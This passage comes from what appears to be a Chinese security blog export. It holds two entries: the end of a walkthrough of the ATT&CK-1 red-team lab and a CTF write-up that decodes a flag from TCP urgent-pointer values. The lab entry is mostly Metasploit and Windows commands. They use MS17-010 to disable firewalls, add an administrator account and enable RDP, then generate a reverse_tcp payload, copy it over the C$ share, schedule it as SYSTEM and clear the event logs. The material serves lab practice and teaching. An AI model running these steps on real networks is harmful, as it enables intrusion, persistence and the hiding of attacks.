它可以使任何程序通过代理上网， 允许TCP和DNS通过代理隧道， 支持HTTP、 SOCKS4和SOCKS5类型的代理服务器， 并且可配置多个代理。 ProxyChains通过一个用户定义的代理列表强制连接指定的应用程序，  直接断开接收方和发送方的连接。</p><p>如果没有ProxyChains的话先 <code>apt install proxychains </code></p><p>然后修改&#x2F;etc&#x2F;proxychains.conf文件</p><p>首次install还需要去掉dynamic_chain的注释<br><img src="/WEB/ATT&CK-1/image-20230429141944115.png" alt="image-20230429141944115">    </p><p><img src="/WEB/ATT&CK-1/image-20230429125456408.png" alt="image-20230429125456408"></p><p>成功再kali命令行访问内网ip</p><p><img src="/WEB/ATT&CK-1/image-20230429144516081.png" alt="image-20230429144516081"></p><p>后面的步骤不需要配置socks5代理也可完成，只需要在msf配置好路由就能攻击</p><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><h4 id="MS17-010打ROOT-TVI862UBEH"><a href="#MS17-010打ROOT-TVI862UBEH" class="headerlink" title="MS17-010打ROOT-TVI862UBEH"></a>MS17-010打ROOT-TVI862UBEH</h4><p>上面已经用过fscan收集信息了，似乎域内其他两台主机都有 MS17-010 ，那就直接用msf一把梭试试了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230429210730877.png" alt="image-20230429210730877"></p><p><code>exploit/windows/smb/ms17_010_psexec</code>模块执行失败。。。</p><p><img src="/WEB/ATT&CK-1/image-20230429210740703.png" alt="image-20230429210740703"></p><h5 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h5><p><code>auxiliary/admin/smb/ms17_010_command</code>模块可以执行命令，通过这个模块先关闭防火墙，再尝试<code>windows/smb/ms17_010_psexec</code>模块，依旧失败，尝试其他方法吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">set rhosts 192.168.52.141</span><br><span class="line">set command netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><h5 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h5><p>​<code>auxiliary/admin/smb/ms17_010_command</code>模块可以执行命令，那么我们可以直接添加用户，然后改权限，关防火墙，然后直接远程登录</p><p><img src="/WEB/ATT&CK-1/image-20230429211013036.png" alt="image-20230429211013036"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.52.141</span><br><span class="line">set command net user admin123 hongrisec@2023 /add #添加用户</span><br><span class="line">exploit</span><br><span class="line">set command net localgroup administrators admin123 /add #管理员权限</span><br><span class="line">exploit</span><br><span class="line">set command  &quot;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\&quot; \&quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&quot; #开启3389</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230429215557203.png" alt="image-20230429215557203"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rdesktop 192.168.52.141</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230429215734594.png" alt="image-20230429215734594"></p><p><img src="/WEB/ATT&CK-1/image-20230429221211746.png" alt="image-20230429221211746"></p><p>登录然后上msf木马然后getsystem拿下</p><p>当然域控也可以用同一种方式拿下，但是为了学习，还是使用其他方法吧</p><h4 id="psexec-打域控"><a href="#psexec-打域控" class="headerlink" title="psexec 打域控"></a>psexec 打域控</h4><p>参考：<br>    <a href="https://www.freebuf.com/articles/system/332115.html">https://www.freebuf.com/articles/system/332115.html</a><br>    <a href="https://blog.csdn.net/qq_41874930/article/details/108455478">https://blog.csdn.net/qq_41874930/article/details/108455478</a></p><h5 id="什么是Psexec"><a href="#什么是Psexec" class="headerlink" title="什么是Psexec"></a>什么是Psexec</h5><p><code>PsExec</code>是由<code>Mark Russinovich</code>创建的 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">Sysinternals Suite</a>中包含的工具。最初，它旨在作为系统管理员的便利工具，以便他们可以通过在远程主机上运行命令来执行维护任务。<code>PsExec</code>可以算是一个轻量级的 telnet  替代工具，它使您无需手动安装客户端软件即可执行其他系统上的进程，并且可以获得与命令控制台几乎相同的实时交互性。PsExec最强大的功能就是在远程系统和远程支持工具（如 ipconfig、whoami）中启动交互式命令提示窗口，以便显示无法通过其他方式显示的有关远程系统的信息。</p><h5 id="先关闭防火墙"><a href="#先关闭防火墙" class="headerlink" title="先关闭防火墙"></a>先关闭防火墙</h5><p>还是通过ms17_010执行命令关闭防火墙</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">set command netsh advfirewall set allprofiles sate off</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230430005650634.png" alt="image-20230430005650634"></p><h5 id="使用msf的psexec模块"><a href="#使用msf的psexec模块" class="headerlink" title="使用msf的psexec模块"></a>使用msf的psexec模块</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set RHOSTS 192.168.52.138</span><br><span class="line">set SMBUser Administrator</span><br><span class="line">set smbpass hongrisec@win7</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>还是失败，谷歌了个遍，不知道是什么原因，可能是因为环境或者msf版本问题吧，尝试其他做法吧</p><p><img src="/WEB/ATT&CK-1/image-20230430013340595.png" alt="image-20230430013340595"></p><h4 id="C盘共享传马打域控"><a href="#C盘共享传马打域控" class="headerlink" title="C盘共享传马打域控"></a>C盘共享传马打域控</h4><p>参考：</p><p>​<a href="https://blog.csdn.net/qq_53263789/article/details/115091561">https://blog.csdn.net/qq_53263789/article/details/115091561</a>   <a href="https://blog.csdn.net/qq_40638006/article/details/122033546">https://blog.csdn.net/qq_40638006/article/details/122033546</a></p><h5 id="用win7连接域控的c盘共享"><a href="#用win7连接域控的c盘共享" class="headerlink" title="用win7连接域控的c盘共享"></a>用win7连接域控的c盘共享</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sessions 1</span><br><span class="line">shell</span><br><span class="line">net use \\192.168.52.138\c$ &quot;hongrisec@2021&quot; /user:&quot;administrator&quot;</span><br><span class="line">dir \\192.168.52.138\c$</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/1682790402459.png" alt="1682790402459"></p><h5 id="生成反弹shell"><a href="#生成反弹shell" class="headerlink" title="生成反弹shell"></a>生成反弹shell</h5><p>因为现在是在用win7（192.168.52.143）做跳板打内网，所以反弹的是win7的ip和端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.52.143 LPORT=9999 -f exe -o msf_msf.exe</span><br></pre></td></tr></table></figure><p>先把生成的shell upload到win7里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload msf_msf.exe ./shell.exe</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230430022300283.png" alt="image-20230430022300283"></p><p>重新shell后dir看看，找到upload的shell</p><p><img src="/WEB/ATT&CK-1/image-20230430022346120.png" alt="image-20230430022346120"></p><p>将shell复制到共享c盘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy shell.exe \\192.168.52.138\c$\shell_msf.exe</span><br></pre></td></tr></table></figure><h5 id="写定时任务"><a href="#写定时任务" class="headerlink" title="写定时任务"></a>写定时任务</h5><p>写定时任务，每分钟执行一次</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /sc minute /mo 1 /tn &quot;srn4&quot; /tr &quot;C:\shell.exe&quot; /S 192.168.52.138 /RU System /u administrator /p &quot;hongrisec@win7&quot;</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230430022516216.png" alt="image-20230430022516216"></p><h5 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.52.143</span><br><span class="line">set lport 9999</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>成功拿下域控！！（如果没有反弹成功可能是win7也就是143的机子没有关防火墙</p><p><img src="/WEB/ATT&CK-1/image-20230430150932590.png" alt="image-20230430150932590"></p><p><img src="/WEB/ATT&CK-1/image-20230430151509582.png" alt="image-20230430151509582"></p><h2 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h2><p>msf自带的痕迹清理    #清除windows中的应用程序日志、系统日志、安全日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clearev </span><br></pre></td></tr></table></figure><p>全部清一遍就好了</p><p><img src="/WEB/ATT&CK-1/image-20230430153855898.png" alt="image-20230430153855898"></p><p>参考：<a href="https://www.freebuf.com/articles/web/226240.html">https://www.freebuf.com/articles/web/226240.html</a><br>            <a href="https://cloud.tencent.com/developer/article/1937037">https://cloud.tencent.com/developer/article/1937037</a><br>            <a href="https://cloud.tencent.com/developer/article/1759960">https://cloud.tencent.com/developer/article/1759960</a><br>            <a href="https://blog.csdn.net/m0_55793759/article/details/126514312">https://blog.csdn.net/m0_55793759/article/details/126514312</a><br>            <a href="https://www.anquanke.com/post/id/235101#h2-21">https://www.anquanke.com/post/id/235101#h2-21</a></p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 红队 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCP-urgent-pointer</title>
      <link href="/Writeup/MISC/TCP-urgent-pointer/"/>
      <url>/Writeup/MISC/TCP-urgent-pointer/</url>
      
        <content type="html"><![CDATA[<h1 id="TCP-urgent-pointer"><a href="#TCP-urgent-pointer" class="headerlink" title="TCP-urgent-pointer"></a>TCP-urgent-pointer</h1><p>　　<strong>知识点：流量分析、urgent-pointer、脚本编写</strong></p><p>　　‍</p><p>　　首先分析流量，发现upload了一张图片，猜测有关键信息</p><p>　　<img src="/Writeup/MISC/TCP-urgent-pointer/image-20230108220119-fn0x4aa.png" alt="image"></p><p>　　‍</p><p>　　发现上传了一张图片，将它导出</p><p>　　<img src="/Writeup/MISC/TCP-urgent-pointer/image-20230108220216-etjkc21.png" alt="image"></p><p>　　<img src="/Writeup/MISC/TCP-urgent-pointer/image-20230108220302-h67sn7h.png" alt="image"></p><p>　　‍</p><p>　　得到图片，提示urg</p><p>　　<img src="/Writeup/MISC/TCP-urgent-pointer/image-20230108220316-295m7jj.png" alt="image"></p><p>　　参考<a href="https://writeup.ctfhub.com/Challenge/2019/%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/%E6%88%90%E9%83%BD%E7%AB%99/v1v1LKxrfTfJNn1CaRtkhE.html">https://writeup.ctfhub.com/Challenge/2019/%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/%E6%88%90%E9%83%BD%E7%AB%99/v1v1LKxrfTfJNn1CaRtkhE.html</a></p><p>　　‍</p><p>　　根据提示观察流量包的urgent-pointer</p><p>　　<img src="/Writeup/MISC/TCP-urgent-pointer/image-20230110205344-ujgbhol.png" alt="image"></p><p>　　​</p><p>　　用tshark命令将urgent-pointer的非0值全部导出，并将换行符替换为空格</p><p>　　<img src="/Writeup/MISC/TCP-urgent-pointer/image-20230108220429-nwj9po7.png" alt="image"></p><p>　　‍</p><p>　　基本上每组都是五位数，猜测是十进制数转十六进制，十六进制再转ascii字符</p><p>　　<img src="/Writeup/MISC/TCP-urgent-pointer/image-20230110205529-qd40jod.png" alt="image"><img src="/Writeup/MISC/TCP-urgent-pointer/image-20230110210021-n4hwn58.png" alt="image"></p><p>　　得到lf，反过来就说flag的前两个字符，根据这个规则编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = [<span class="number">27750</span>, <span class="number">26465</span>, <span class="number">24955</span>, <span class="number">13113</span>, <span class="number">14393</span>, <span class="number">25907</span>, <span class="number">25910</span>, <span class="number">25905</span>, <span class="number">14647</span>, <span class="number">25701</span>, <span class="number">13622</span>, <span class="number">12644</span>, <span class="number">12848</span>, <span class="number">14178</span>, <span class="number">12599</span>, <span class="number">13411</span>, <span class="number">14642</span>, <span class="number">12387</span>, <span class="number">32054</span>, <span class="number">56125</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(long_to_bytes(i))[<span class="number">2</span>:-<span class="number">1</span>][::-<span class="number">1</span>],<span class="string">&quot;(&quot;</span>,long_to_bytes(i),<span class="string">&quot;)&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>　　<img src="/Writeup/MISC/TCP-urgent-pointer/image-20230110210211-7bb8x83.png" alt="image">​</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 流量分析 </tag>
            
            <tag> urgent-pointer </tag>
            
            <tag> 脚本编写 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
